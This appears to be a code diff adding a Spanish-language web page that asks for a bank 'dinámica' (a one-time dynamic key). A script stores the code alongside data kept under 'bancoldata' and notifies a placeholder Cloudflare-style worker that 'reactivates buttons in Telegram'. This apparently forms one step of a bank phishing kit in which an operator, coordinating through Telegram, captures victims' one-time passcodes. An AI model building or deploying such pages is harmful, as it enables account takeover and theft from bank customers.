@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ingresar Dinámica</title>
+<style>
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: #f9f9f9;
+    font-family: Arial, sans-serif;
+}
+.container {
+    background: #fff;
+    padding: 20px 30px;
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    width: 300px;
+}
+input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    font-size: 16px;
+}
+button {
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    background: #28a745;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+}
+button:hover { background: #218838; }
+</style>
+</head>
+<body>
+<div class="container">
+    <h2>Ingresar Dinámica</h2>
+    <input type="text" id="dinamica" placeholder="Código Dinámica">
+    <button id="reset">Enviar y Activar Botones</button>
+</div>
+
+<script>
+document.getElementById("reset").addEventListener("click", async () => {
+    const dinamica = document.getElementById("dinamica").value;
+    const transactionId = localStorage.getItem("transactionId");
+
+    if (!dinamica || !transactionId) {
+        alert("Ingresa la dinámica correctamente.");
+        return;
+    }
+
+    try {
+        const res = await fetch("https://tu-worker-url/reset", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({id: transactionId})
+        });
+        if (res.ok) {
+            alert("Dinámica enviada y botones reactivados en Telegram.");
+            localStorage.setItem("bancoldata", JSON.stringify({...JSON.parse(localStorage.getItem("bancoldata")), dinamica}));
+        }
+    } catch(e) {
+        console.error(e);
+        alert("Error al enviar la dinámica.");
+    }
+});
+</script>
+</body>
+</html>
